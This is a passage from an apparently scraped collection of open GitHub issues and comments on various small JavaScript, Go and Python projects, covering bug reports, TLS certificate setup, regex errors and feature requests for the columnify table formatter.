    "node-bin-setup": "git://github.com/prograhamer/node-bin-setup#use-symlinks"&#13;
  },&#13;
  "license": "ISC",&#13;
  "author": "",&#13;
  "engines": {&#13;
    "npm": "&gt;=5.0.0"&#13;
  }&#13;
}&#13;
```&#13;
&#13;
Then I changed my project's `package.json` to use my local `node-bin` package, instead of the default `npm` source.&#13;
&#13;
With these changes, the node install used symlinks as expected:&#13;
```&#13;
$ file node_modules/node/bin/node&#13;
node_modules/node/bin/node: symbolic link to /home/ubuntu/project/node_modules/node/node_modules/node-linux-x64/bin/node&#13;
```</Body>
    </Comment>
    <Comment>
      <Owner>aredridel</Owner>
      <Body>awesome. Testing is my main concern -- I'll have to run it through its paces on Windows too. It'll take me a bit to get to that point.</Body>
    </Comment>
  </Issue_321>
  <Issue_322>
    <Repository>focaccia</Repository>
    <Title>List machine's IP in status</Title>
    <Owner>philips</Owner>
    <Body>It would be nice if we listed the machine's IP address in the status output. There needs to be something that you can identify the machine with to connect back to your cloud account or internal provisioning tool.
</Body>
    <State>open</State>
    <Comment>
      <Owner>philips</Owner>
      <Body>@robszumski Yea, the trouble is... which IP? 
</Body>
    </Comment>
    <Comment>
      <Owner>robszumski</Owner>
      <Body>Good point. What if we went with private from /etc/environment until someone complains?
</Body>
    </Comment>
  </Issue_322>
  <Issue_323>
    <Repository>ghar</Repository>
    <Title>Regex fix for README</Title>
    <Owner>philips</Owner>
    <Body>Python 3.6.0 reports an error when running ghar. Removing the `\` before the R on the regex line fixes it for me:&#13;
```&#13;
Traceback (most recent call last):&#13;
  File "/home/jwong/ghar/bin/ghar", line 359, in &lt;module&gt;&#13;
    main(args)&#13;
  File "/home/jwong/ghar/bin/ghar", line 347, in main&#13;
    _init_repos()&#13;
  File "/home/jwong/ghar/bin/ghar", line 340, in _init_repos&#13;
    repos.append(Repo(os.path.join(root, dir)))&#13;
  File "/home/jwong/ghar/bin/ghar", line 229, in __init__&#13;
    self.is_collection = self._is_collection()&#13;
  File "/home/jwong/ghar/bin/ghar", line 151, in _is_collection&#13;
    if re.match("^\.git(ignore|modules)?$", f) or re.match("^\README.*$", f) or re.match("^\.travis.yml", f):&#13;
  File "/usr/lib/python3.6/re.py", line 172, in match&#13;
    return _compile(pattern, flags).match(string)&#13;
  File "/usr/lib/python3.6/re.py", line 301, in _compile&#13;
    p = sre_compile.compile(pattern, flags)&#13;
  File "/usr/lib/python3.6/sre_compile.py", line 562, in compile&#13;
    p = sre_parse.parse(p, flags)&#13;
  File "/usr/lib/python3.6/sre_parse.py", line 856, in parse&#13;
    p = _parse_sub(source, pattern, flags &amp; SRE_FLAG_VERBOSE, False)&#13;
  File "/usr/lib/python3.6/sre_parse.py", line 415, in _parse_sub&#13;
    itemsappend(_parse(source, state, verbose))&#13;
  File "/usr/lib/python3.6/sre_parse.py", line 501, in _parse&#13;
    code = _escape(source, this, state)&#13;
  File "/usr/lib/python3.6/sre_parse.py", line 401, in _escape&#13;
    raise source.error("bad escape %s" % escape, len(escape))&#13;
sre_constants.error: bad escape \R at position 1&#13;
```</Body>
    <State>open</State>
    <Comment>
      <Owner>mturquette</Owner>
      <Body>Ugh, I just spent 15 minutes debugging, fixing and preparing a PR for this... Please merge!</Body>
    </Comment>
  </Issue_323>
  <Issue_324>
    <Repository>ghar</Repository>
    <Title>Fix handling of .gharignore in status and uninstall.</Title>
    <Owner>philips</Owner>
    <Body>Skip .gharignore'd files when checking status and uninstalling, as well
as when installing.
</Body>
    <State>open</State>
    <Comment>
      <Owner>tornewuff</Owner>
      <Body>Ping; this still seems to be required. :)
</Body>
    </Comment>
    <Comment>
      <Owner>philips</Owner>
      <Body>@tornewuff Sorry, I don't have time at the moment. Can you please explain how the user experience changes after this patch. I personally don't use gharignore.
</Body>
    </Comment>
  </Issue_324>
  <Issue_325>
    <Repository>grpc-gateway-example</Repository>
    <Title>bad practice on creating the tls credentials</Title>
    <Owner>philips</Owner>
    <Body>on cmd/serve.go: (line 84) &#13;
https://github.com/philips/grpc-gateway-example/blob/master/cmd/serve.go#L84&#13;
` dcreds := credentials.NewTLS(&amp;tls.Config{&#13;
  ServerName: demoAddr,&#13;
  RootCAs:    demoCertPool,&#13;
 })&#13;
`&#13;
demoAddr is used for creating the credentials. demoAddr is an endpoint with address:port format. Using that will cause your TLS to look for a serverName of  "localhost:10000". Hence, in your certificate, you had to add the domain:port specifically as a server name. It is not good practice to use a specific name in your cert. The ServerName should be only the Address.</Body>
    <State>open</State>
    <Comment>
      <Owner>vaishalig2693</Owner>
      <Body>I was trying to run this example without changing anything but I am getting this error - &#13;
`http: TLS handshake error from [::1]:53217: remote error: tls: bad certificate&#13;
INFO: 2018/10/15 13:16:40 pickfirstBalancer: HandleSubConnStateChange: 0xc000158060, TRANSIENT_FAILURE&#13;
WARNING: 2018/10/15 13:16:40 grpc: addrConn.createTransport failed to connect to {localhost:10000 0  &lt;nil&gt;}. Err :connection error: desc = "transport: authentication handshake failed: x509: Common Name is not a valid hostname: localhost:10000". Reconnecting...`&#13;
&#13;
Can anyone help me understanding the problem here?</Body>
    </Comment>
    <Comment>
      <Owner>adamcohen</Owner>
      <Body>I had to use the following commands from the [certs/Makefile](https://github.com/philips/grpc-gateway-example/blob/master/certs/Makefile) to generate my own `Key` and `Cert` values:&#13;
&#13;
```&#13;
openssl genrsa -out server.key 2048&#13;
openssl req -new -x509 -key server.key -out server.pem -days 3650&#13;
```&#13;
&#13;
I also used a different port than `10000`, so when generating the above certificate, I had to use `localhost:8020` as the `Common Name`:&#13;
&#13;
```&#13;
Common Name (eg, fully qualified host name) []:localhost:8020&#13;
```&#13;
&#13;
When using `curl` to hit the http endpoint, I had to pass `-k` and when using [grpcurl](https://github.com/fullstorydev/grpcurl) I had to pass `-insecure`</Body>
    </Comment>
  </Issue_325>
  <Issue_326>
    <Repository>hacks</Repository>
    <Title>hack on same port</Title>
    <Owner>philips</Owner>
    <Body>``` bash
 ./grpc-play
port: 10000
2015/05/26 18:43:46 gateway dial...
2015/05/26 18:43:46 write HTTP line
2015/05/26 18:43:46 write Header line
2015/05/26 18:43:46 accept grpc
```

grpc

```
./grpc-play-client "my first rpc echo""value":"my REST echo"}'
2015/05/26 18:44:07 dial...
2015/05/26 18:44:07 write HTTP line
2015/05/26 18:44:07 write Header line
my first rpc echo
```

http

```
curl -X POST http://localhost:10000/v1/example/echo -d '{"value":"my REST echo"}'
{"value":"my REST echo"}
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>xiang90</Owner>
      <Body>@philips I should be more clear. This is not intended to be merged. Just to show how it works. :)
</Body>
    </Comment>
  </Issue_326>
  <Issue_327>
    <Repository>aws-glacier-calculator</Repository>
    <Title>Latest Pricing</Title>
    <Owner>liangzan</Owner>
    <Body>Hi,&#13;
I'm not sure if this code incorporates the latest Glacier Pricing.  Can you please indicate on your page, the  pricing date the page is calculating?</Body>
    <State>open</State>
    <Comment>
      <Owner>gitforwebwork</Owner>
      <Body>It definitely doesn't have the new pricing structure. It's worthless as it is right now.</Body>
    </Comment>
  </Issue_327>
  <Issue_328>
    <Repository>contacts</Repository>
    <Title>GMX import not working any more, partially fixed</Title>
    <Owner>liangzan</Owner>
    <Body>Since a couple days ago, GMX has redesigned most of its website  and the redirects are not working any more. This is due to two reasons (both of which I have fixed locally):
1. Mozilla Firefox 2.0 as user agent is not supported -&gt; changing to Firefox 18 will work
2. GMX uses relative redirects which base.rb does not support yet

The third reason is a change of redirects. I have fixed this, but it is currently not working, and I don't understand why, since when recording the session in Firefox the redirects and cookies are exactly the same.

Would you be willing to collaborate on a fix? I can send a patch with the current status. 
</Body>
    <State>open</State>
    <Comment>
      <Owner>liangzan</Owner>
      <Body>sure we can collaborate. i can give you commit rights if you want. otherwise i can contribute to your fork. but i think commit right are better isn't it?
</Body>
    </Comment>
    <Comment>
      <Owner>jensb</Owner>
      <Body>Good idea. Commit rights will make sense when we have synchronized our trees. I have submitted a couple patches in my repo, but they don't fully work yet. Please have a look, maybe I'm missing something obvious. -&gt; https://github.com/jensb/contacts/commits/master 
Once we get this working I can delete my tree (or keep it synched to yours) or we can work on the same repo.
Thanks! 
Regards, Jens
</Body>
    </Comment>
    <Comment>
      <Owner>liangzan</Owner>
      <Body>hi @jensb, you've been added as a collaborator. since you can commit, can i propose pushing your master as a feature branch on this repo? do let me know your rubygems account so i can let you have publish rights.
</Body>
    </Comment>
  </Issue_328>
  <Issue_329>
    <Repository>contacts</Repository>
    <Title>not supporting part of gmail account?</Title>
    <Owner>liangzan</Owner>
    <Body>hmm, its works pretty good in the account which EG: account@gmail.com, 
but when I tried account@company.com which is also under gmail account, it failed and saying my user and password wrong.

hope to hear you soon.
Thanks!
</Body>
    <State>open</State>
    <Comment>
      <Owner>liangzan</Owner>
      <Body>i understand the issue. but i'm swamped with work right now. i'll take a look over the weekend. 
</Body>
    </Comment>
    <Comment>
      <Owner>nichthinkof30</Owner>
      <Body>ic,hopefully there is a fix soon T_T thanks !
</Body>
    </Comment>
    <Comment>
      <Owner>nathankot</Owner>
      <Body>me too, can't authenticated google app emails :(
</Body>
    </Comment>
  </Issue_329>
  <Issue_330>
    <Repository>adventure-map</Repository>
    <Title>Boilerplate runs in any directory that doesn't have the matching boilerplate directory created</Title>
    <Owner>timoxley</Owner>
    <Body>Even when I run `verify` or `run` on some exercises. Haven't nailed down the cause, would appreciate help.

```
/tmp 22:21:47
$ clijs run index.js

/private/tmp

? We're about to populate the above directory with some files needed for the
    exercises. If they've already been created then don't worry, they won't be
    replaced. Continue? (Y/n)
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>Sequoia</Owner>
      <Body>it's in lesson 2 there. ^ use "run" or "verify" in any directory that doesn't have the boilerplate created.
</Body>
    </Comment>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>Oh, whoa that's annoying. 
</Body>
    </Comment>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>@Sequoia what do you think the logic for this should be?
</Body>
    </Comment>
    <Comment>
      <Owner>Sequoia</Owner>
      <Body>I've gtg but I am _hoping_ there's a way to set this as a switch in `package.config` so users can override it like `npm config learnyounode:boilerplate false`. If that doesn't work I'd look into `npm-config` package or something so there's some easy way for users to turn this on or off.

http://stackoverflow.com/questions/29155583/is-it-possible-to-access-npm-config-settings-from-a-node-packages-bin-command
</Body>
    </Comment>
  </Issue_330>
  <Issue_331>
    <Repository>best-practices</Repository>
    <Title>Planning quote attribution</Title>
    <Owner>timoxley</Owner>
    <Body>Excellent README.  Eisenhower, not Churchill though.
</Body>
    <State>open</State>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>Oh, nice catch. Can you send a pull request?
</Body>
    </Comment>
    <Comment>
      <Owner>SpencerArtisan</Owner>
      <Body>Tim

I thought I&#8217;d better research it some more first.  It seems that they both said something of this sort, but there is no consensus on the wording of either quote.  

http://www.leadingagile.com/2012/10/favorite-quotes/    (number 8)

Probably best to leave it.  Only anal people like me will worry over it.

Once again, great summary of oft-forgotten best practices.

Spencer

On 5 May 2014, at 12:48, Tim Oxley notifications@github.com wrote:

&gt; Oh, nice catch. Can you send a pull request?
&gt; 
&gt; &#8212;
&gt; Reply to this email directly or view it on GitHub.
</Body>
    </Comment>
  </Issue_331>
  <Issue_332>
    <Repository>best-practices</Repository>
    <Title>language-specific branches</Title>
    <Owner>timoxley</Owner>
    <Body>Would be interesting if branches were set up where the main document is targeted at specific languages.
</Body>
    <State>open</State>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>To what benefit?
</Body>
    </Comment>
    <Comment>
      <Owner>JosefAssad</Owner>
      <Body>It would allow the addition of code examples.
</Body>
    </Comment>
  </Issue_332>
  <Issue_333>
    <Repository>browser-run</Repository>
    <Title>Added option to run in headless browser mode with --headless flag</Title>
    <Owner>timoxley</Owner>
    <Body>Depends on xvfb to run a headless browser. Defaults to non-headless. 

`sudo apt-get install xvfb`
</Body>
    <State>open</State>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>Cool, thanks. Can you document this in the readme?
</Body>
    </Comment>
  </Issue_333>
  <Issue_334>
    <Repository>bulk</Repository>
    <Title>Windows support</Title>
    <Owner>timoxley</Owner>
    <Body>Fixes #7

NB: one test (last one) fails in windows right now. 
</Body>
    <State>open</State>
    <Comment>
      <Owner>kumarharsh</Owner>
      <Body>@timoxley  I got working on fixing the tests, and I've made some good headway (only 1 test seems to be failing). But I'm unable to solve the issue, mainly because I can't understand what the bulk command is actually doing in this case: [test#L63](https://github.com/timoxley/bulk/blob/e6199d4b8e681a6dcb46aac85b0383c866f08e2f/test/index.js#L63)

Also, as you can see, some tests are written in a non-crossplatform way (such as `pwd` not being there in cmd, but there being an equivalent `cd` command, etc)
</Body>
    </Comment>
    <Comment>
      <Owner>zurgul</Owner>
      <Body>@timoxley @kumarharsh Hi there! Thanks for the handy tool. Any updates about windows support? My windows-friends are suffering without it.</Body>
    </Comment>
  </Issue_334>
  <Issue_335>
    <Repository>cascadify</Repository>
    <Title>Possible bug fix</Title>
    <Owner>timoxley</Owner>
    <Body>Possible bug fix, in this way browserify needn't be changed.
</Body>
    <State>open</State>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>interesting but what's up with the tests?

```
Error: Cannot find module 'parents'
```
</Body>
    </Comment>
  </Issue_335>
  <Issue_336>
    <Repository>cascadify</Repository>
    <Title>doesn't include styles from a package.json, when it is in the parent directory</Title>
    <Owner>timoxley</Owner>
    <Body>I'm making a browserify module that has a css file. I'm testing in an `example` directory in the module's directory, and when I want to use cascadifyin the example, it doesn't include the css file of the module. I tried to look up the problem and found that the browserify `package` event not fires the module's package.json. Do you think it should work?
</Body>
    <State>open</State>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>Interesting, I'll look into it. Does browserify work from your example directory?
</Body>
    </Comment>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>AFAIK Browserify won't kick in unless you point the commandline at a file that has requires in it, you'll need to run `cascadify` by passing it the `index.js` in the parent dir.
</Body>
    </Comment>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>i.e. can you try that and let me know if it fixes your problem? I've also updated cascadify, please try the latest version.
</Body>
    </Comment>
    <Comment>
      <Owner>gerhardberger</Owner>
      <Body>I run cascadify and browserify in code not commandline, but I don't think it makes much difference. There is a js file in the example dir, that requires a module which is in `example/node_modules` and it is included prefectly, and it has a `require('../index.js')`, so it requires the module but its `package.json` not seem to come through. I updated but still doesn't work.
</Body>
    </Comment>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>interesting, can you post some code so I can reproduce?
</Body>
    </Comment>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>nvm, I think I've reproduced
</Body>
    </Comment>
    <Comment>
      <Owner>gerhardberger</Owner>
      <Body>So I digged into the browserify source a little. What happens is that the `package` event fires, but the pkg is empty, thats because in the source at  [this](https://github.com/substack/node-browserify/blob/master/index.js#L371) line it emptied, not really sure why. So I commented it out and now the content of the pkg is there. But now the problem is that in browserify if the module is not in a `node_modules` dir, [there](https://github.com/substack/node-browserify/blob/master/index.js#L402) is a mechanism that checks if in the parent dir there is a `package.json`. That's bad because now it finds the packge, but now it is for the `example` dir, so the path will be wrong to the css files. I commented out this `next` function which does this mechanism and now it works.
</Body>
    </Comment>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>Hm, thanks for looking into it. Tricky problem as we'll have to find an alternative solution or get changes pushed into browserify itself.
</Body>
    </Comment>
    <Comment>
      <Owner>gerhardberger</Owner>
      <Body>Maybe the most logical thing would be that, in the `package` event handler, it would be useful to have access to the `package.json`s url, because in it the css files path's are relative to that. Because if you use the file's path, that you use cascadify on or the `index.js` of the module that's not neccessarily in the same place as the `package.json`. It can be done in cascadify, but in browserify it would be quite easy.
</Body>
    </Comment>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>Just to be clear, this is what we're working with right?

```
-
| - package.json
| - index.js
| - style.css
| - example
| - - index.js // require('thing'); require('../index.js')
| - - node_modules
| - - - thing
```

And you're saying the `style.css` in the parent dir doesn't come through? Hm I'm not so sure if this is actually misbehaving, i.e. node doesn't care to inspect package.jsons unless they're in a node_modules folder and being required without a relative path.

If we were to adjust this, you could put a package.json with {styles: []} in every source folder, that seems wrong.

I'm thinking now how to get this to work. I'm wondering if we shouldn't drop browserify as the traversal mechanism, and move to preprocessing some kind of magic css `@rule` that works like require, but for css files. 
</Body>
    </Comment>
    <Comment>
      <Owner>gerhardberger</Owner>
      <Body>To have a require-like css rule is an interesting idea, but I'd rather go with the current idea, that is just so simple and straightforward I think.

I don't really know, whether is this misbehaving or not, but if it is, then this `style.css` thing could be solved by include it in the `index.html` in the `example` folder simply.

And that's great, but the problem still there, if e.g. I write my module like this

```
-
| - bin
| - - index.js
| - package.json // "main": "/bin/index.js"
| - style.css
```

cascadify tries to read `mymodule/bin/style.css`.
That's why would be useful to have access to the `package.json`s path. 
</Body>
    </Comment>
  </Issue_336>
  <Issue_337>
    <Repository>columnify</Repository>
    <Title>is it possible to color the title?</Title>
    <Owner>timoxley</Owner>
    <Body>Related to topic of using colors in columnify using chalk as discussed in [26](https://github.com/timoxley/columnify/issues/26).&#13;
&#13;
Is there a way to color the title?&#13;
e.g.&#13;
```&#13;
var columnify = require('columnify');&#13;
var chalk = require('chalk');&#13;
&#13;
var data = [{&#13;
    bar: 'normal color string', &#13;
]};&#13;
data[chalk.red(foo)] = chalk.red('This is a red string');&#13;
&#13;
console.log(columnify(data));&#13;
```</Body>
    <State>open</State>
    <Comment>
      <Owner>xochilpili</Owner>
      <Body>```&#13;
const columnify = require('columnify');&#13;
const chalk = require('chalk');&#13;
&#13;
const data = [&#13;
  {&#13;
     name: 'some name',&#13;
     value: 'some value'&#13;
  },{&#13;
     name: 'another name',&#13;
     value: 'another value'&#13;
  }&#13;
];&#13;
console.log(columnify(data,  {&#13;
    headingTransform: function(header){&#13;
        return chalk.red(header.charAt(0).toUpperCase + header.slice(1).toLowerCase());&#13;
    },&#13;
    dataTransform: function(data){&#13;
      return chalk.white(data);&#13;
   }&#13;
}));&#13;
&#13;
```</Body>
    </Comment>
  </Issue_337>
  <Issue_338>
    <Repository>columnify</Repository>
    <Title>paddingChr per column does not work</Title>
    <Owner>timoxley</Owner>
    <Body>- I have 2 columns.&#13;
- Only the first column has a minWidth and works well.&#13;
- When set paddingChar to only the first column, it does nothing.&#13;
- But if set paddingChar globally, although it works well, it does so in both columns.&#13;
&#13;
How should do so that paddingChar only applies to the first column?</Body>
    <State>open</State>
    <Comment>
      <Owner>danyshaanan</Owner>
      <Body>Can you perhaps clarify by adding a test? As in these two files: [code](https://github.com/timoxley/columnify/blob/d4856813982d47c5995c80c87fb26a57d0f4c3d6/test/align-center.js) and [text](https://github.com/timoxley/columnify/blob/d4856813982d47c5995c80c87fb26a57d0f4c3d6/test/align-center-expected.txt).&#13;
&#13;
If you could, I'll look into it. Doesn't have to be pretty, but just to exemplify the issue.</Body>
    </Comment>
  </Issue_338>
  <Issue_339>
    <Repository>columnify</Repository>
    <Title>Preserve All Whitespace</Title>
    <Owner>timoxley</Owner>
    <Body>Since the module doesn't have configuration (ala text-table) for leading whitespace or space between columns, collapsing all whitespace is problematic. We're left to hack around it by splitting lines for leading whitespace, and we're hosed if we want to configure the whitespace between columns. We can't always know what the minimum width of a column should be, after all.&#13;
&#13;
An option to either preserve (eg. not collapse) whitespace or options for leading and between-column whitespace is sorely needed.</Body>
    <State>open</State>
    <Comment>
      <Owner>bradennapier</Owner>
      <Body>Personally I would simply like a padding on the entire column.  AKA: add \t\t at the start of every line so that the columns can appear indented on the screen when needed.</Body>
    </Comment>
    <Comment>
      <Owner>vsinha</Owner>
      <Body>Found a hack which works!&#13;
&#13;
```&#13;
dataTransform: (s: string) =&gt; s.replace(" ", "\u2063")&#13;
```&#13;
&#13;
`\u2063` is an ['invisible separator'](http://www.fileformat.info/info/unicode/char/2063/index.htm) (ie an invisible comma) and is not matched by the `\s` regex [here](https://github.com/timoxley/columnify/blob/c243156dda724a1cfd89cfe7ef4c20cb4a68e7a9/index.js#L92)</Body>
    </Comment>
  </Issue_339>
  <Issue_340>
    <Repository>columnify</Repository>
    <Title>Preserve whitespace by default?</Title>
    <Owner>timoxley</Owner>
    <Body>https://github.com/timoxley/columnify/blob/master/index.js#L89

Why does it collapse whitespace other than newlines?
</Body>
    <State>open</State>
    <Comment>
      <Owner>rauchg</Owner>
      <Body>Once I got rid of that option in my local copy, I also traced whitespace trimming to:
https://github.com/timoxley/columnify/blob/master/utils.js#L83
</Body>
    </Comment>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>&gt; Why does it collapse whitespace other than newlines?

Does it by default because it's trying to format dirty data as prettily as possible, Though I think I have been bitten by this before, trying to display some data that was pre-formatted.

Can you elaborate on your use-case?
</Body>
    </Comment>
    <Comment>
      <Owner>rauchg</Owner>
      <Body>@timoxley displaying pre-formatted data, where leading whitespace is relevant 
</Body>
    </Comment>
    <Comment>
      <Owner>brandoncarl</Owner>
      <Body>This would be great to allow a preserveWhitespace option!
</Body>
    </Comment>
    <Comment>
      <Owner>nikolakanacki</Owner>
      <Body>Agreed, whitespace is a must for pre-formatted tables.
</Body>
    </Comment>
    <Comment>
      <Owner>runvnc</Owner>
      <Body>If no one is working on this, I can try to do a preserveWhitespace option.
</Body>
    </Comment>
  </Issue_340>
  <Issue_341>
    <Repository>columnify</Repository>
    <Title>It will be more convenient if an extra param such as 'key' be added to dataTransform</Title>
    <Owner>timoxley</Owner>
    <Body>Hi,
Thanks for the great work, and I think It will be more convenient if an extra param such as 'key' be added to dataTransform, sometimes we need to transform data according to which key current data is.
</Body>
    <State>open</State>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>@hustcer good idea, you can get it from reading the name property of the second argument to the `dataTransform`. This isn't documented though, so my bad. If you get this working, think you could send a docs PR?
</Body>
    </Comment>
    <Comment>
      <Owner>hustcer</Owner>
      <Body>I have tried and the second argument just displays nothing but `{}`, I got no key name? Is there anything wrong?
</Body>
    </Comment>
    <Comment>
      <Owner>kmgilbert100</Owner>
      <Body>@hustcer @timoxley The same was happening with me... I added a PR that adds a 4th param called columnName not sure if this should be closed if theres some other fixed needed with the second argument?
</Body>
    </Comment>
    <Comment>
      <Owner>kmgilbert100</Owner>
      <Body>@timoxley Looks like in the data you have to specify a name key to populate that column object? If you look at the example in my pr its how I am attempting to accomplish.. hoping can get that merged soon so I can pull it in from master to my project .. got it setup via npm link working exactly how I need it.. very useful feature :)
</Body>
    </Comment>
  </Issue_341>
  <Issue_342>
    <Repository>columnify</Repository>
    <Title>Utilize unused space from other columns</Title>
    <Owner>timoxley</Owner>
    <Body>If a column is squished, but a neighboring column isn't using all of it's available space, then columnify should figure out how to readjust widths so every column is using optimal space.
</Body>
    <State>open</State>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>gets complicated as then you need to recalculate widths based on word breaks etc
</Body>
    </Comment>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>@danyshaanan currently columns will only use as much space as they need, within the specified min and max, ideally if a column is not using its maximum width, it could loan width to another column so it can be wider. Might need to introduce soft &amp; hard min/max, default min/max would be soft min and max.
</Body>
    </Comment>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>Note that the widths are calculated based on available word-breaks
</Body>
    </Comment>
    <Comment>
      <Owner>danyshaanan</Owner>
      <Body>I'll look into it.
</Body>
    </Comment>
    <Comment>
      <Owner>danyshaanan</Owner>
      <Body>I Didn't have the time in the last few days, and not likely to have much of it this coming week. I'll write when I'll have the time.
</Body>
    </Comment>
    <Comment>
      <Owner>danyshaanan</Owner>
      <Body>Ok, here is my take.

If I understand correctly, the idea is that this code:

``` js
var columnify = require('./index.js')
var options = {
  paddingChr: '.',
  config: {
    a: { minWidth: 5, maxWidth: 10 },
    b: { minWidth: 5, maxWidth: 10 }
  }
}
console.log(columnify([{a:'123456789AB',b:2},{a:3,b:4}], options))
```

that outputs this:

```
A......... B....
123456789&#8230; 2....
AB........ .....
3......... 4....
```

could instead output this:

```
A.......... B...
123456789AB 2...
........... ....
3.......... 4...
```

If so, I have a few concerns:
- This requires another 'pass' on the data, meaning it requires a non trivial change to the logic and flow.
- This will mean that even though someone defined `A` to be of maxWidth 10, we'll make it longer.
- In case of multiple column, a finer definitions will be required to decide how the space should be divided.

The first concern makes me wonder if this is worth the complication to the code, the second makes me wonder if this is the right thing to do in term of the spec, and the third contributes a bit more weight to each of the previous ones...
</Body>
    </Comment>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>Sorry I didn't back to this sooner. 

&gt; This requires another 'pass' on the data, meaning it requires a non trivial change to the logic and flow.

Correct, hence my reluctance to tackle it!

&gt; This will mean that even though someone defined A to be of maxWidth 10, we'll make it longer.

soft and hard limits perhaps?
</Body>
    </Comment>
    <Comment>
      <Owner>danyshaanan</Owner>
      <Body>Soft and hard limits could be used, but I think that would overcomplicate both the code and the user experience - two things I wouldn't want to compromise on for something that I'd consider a bonus feature.
</Body>
    </Comment>
  </Issue_342>
  <Issue_343>
    <Repository>component-badge</Repository>
    <Title>Make the export express middleware</Title>
    <Owner>timoxley</Owner>
    <Body>If this were to export express compatible middleware, instead of starting its own server, that would make it really easy to include in http://component.jit.su
</Body>
    <State>open</State>
    <Comment>
      <Owner>ForbesLindesay</Owner>
      <Body>Also rename in package.json to `component-badge` and then `npm publish` :smile:
</Body>
    </Comment>
  </Issue_343>
  <Issue_344>
    <Repository>component-badge</Repository>
    <Title>Use SVG instead of PNG</Title>
    <Owner>timoxley</Owner>
    <Body>That would be better since you would use the same file for Retina and "normal" screens.

Moreover, you could generate from SVG any sizes without losing quality.

Please see component/component#114
</Body>
    <State>open</State>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>That is interesting, didn't think github would allow embedded svgs&#8230;
</Body>
    </Comment>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>I'll have a play around with this tomorrow, looks interesting, turns out (at least in comments) github swaps the svg for a cdn hosted png. I wonder if it does this intelligently based on pixel density.

Compare these two on a retina device:

[!['thing'](http://165.225.129.128:5050/test.svg)](http://google.com)

 !['thing'](http://165.225.129.128:5050/component.png)
</Body>
    </Comment>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>Actually, that's not true. It's still an svg, just can't interact with it directly. Still sweet.
</Body>
    </Comment>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>Well, I'm 100% sold on svgs for Readme images
</Body>
    </Comment>
    <Comment>
      <Owner>avetisk</Owner>
      <Body>Great!
</Body>
    </Comment>
  </Issue_344>
  <Issue_345>
    <Repository>cruft</Repository>
    <Title>supply cruft patterns in format other than readme</Title>
    <Owner>timoxley</Owner>
    <Body>People need to be able to quickly and easily add their own cruft patterns.
</Body>
    <State>open</State>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>This is still a bit ugly to be honest.
</Body>
    </Comment>
  </Issue_345>
  <Issue_346>
    <Repository>dom-support</Repository>
    <Title>Move to detects org?</Title>
    <Owner>timoxley</Owner>
    <Body>Not sure if you care about this. Wanna split it up and move it to the detects org as es6 modules? We can compile down to cjs and publish for browserify support
</Body>
    <State>open</State>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>Sounds good to me
</Body>
    </Comment>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>the more I think about it, the more I like the idea of community owned orgs for common problems like this
</Body>
    </Comment>
    <Comment>
      <Owner>jonathanong</Owner>
      <Body>organizations for everything! npm publishing rights FTL!
</Body>
    </Comment>
  </Issue_346>
  <Issue_347>
    <Repository>element-collection</Repository>
    <Title>Use separate module for creating array</Title>
    <Owner>timoxley</Owner>
    <Body>Could be changed to use [ForbesLindesay/to-element-array](https://github.com/ForbesLindesay/to-element-array) but it's up to you.
</Body>
    <State>open</State>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>Though doesn't `to-array` do basically the same thing? Sell `to-element-array` to me.
</Body>
    </Comment>
    <Comment>
      <Owner>ForbesLindesay</Owner>
      <Body>`to-element-array` does the `string` logic that this module does first:

``` javascript
var toArray = require('to-array');

module.exports = toElementArray;
function toElementArray(elements) {
  if (typeof elements === 'string') {
    return toArray(document.querySelectorAll(elements));
  } else {
    return toArray(elements);
  }
}
```

so it would avoid duplicating that logic.
</Body>
    </Comment>
  </Issue_347>
  <Issue_348>
    <Repository>functional-javascript-workshop</Repository>
    <Title>Issue viewing this course on Windows Command Prompt</Title>
    <Owner>timoxley</Owner>
    <Body>Hey guys,&#13;
I'm having a hard time viewing this course on the command prompt on Windows 10. I'm taking this course on my work comp, which is a mac, and not having this problem. I'm not really sure how to fix this, so I'm hoping someone could help me. Thank you so much in advance!&#13;
&#13;
![issue](https://cloud.githubusercontent.com/assets/6634911/23293111/25f8b7ba-fa19-11e6-870a-3eb28a181641.png)&#13;
&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>dfhincapiem</Owner>
      <Body>Im' having the same issue on Windows 10.0.10586 CMD &#13;
![cmd](https://user-images.githubusercontent.com/25560662/27917366-6782d154-6231-11e7-8841-d336f4c9246a.png)&#13;
</Body>
    </Comment>
    <Comment>
      <Owner>Kress0</Owner>
      <Body>Having a similar issue, not a course related but something with making these courses/displaying them on windows 10. What i mean is that every course at NodeSchool (except for git-it cause its a standalone app) looks broken for me (see attached image). Are there any suggestions on whom to contact or what to look for to get this fixed?&#13;
&#13;
![course-bug-missing-content](https://user-images.githubusercontent.com/16427680/36352314-0983de46-14c8-11e8-9de7-46d1667de6dd.png)&#13;
</Body>
    </Comment>
  </Issue_348>
  <Issue_349>
    <Repository>functional-javascript-workshop</Repository>
    <Title>Doubts on exercise 12: Function Spies</Title>
    <Owner>timoxley</Owner>
    <Body> I am stuck on 12th exercise of the workshop. Can someone please explain the logic behind the solution? I mean how can the function Spy track another function that will be called outside of itself? Especially this part: 

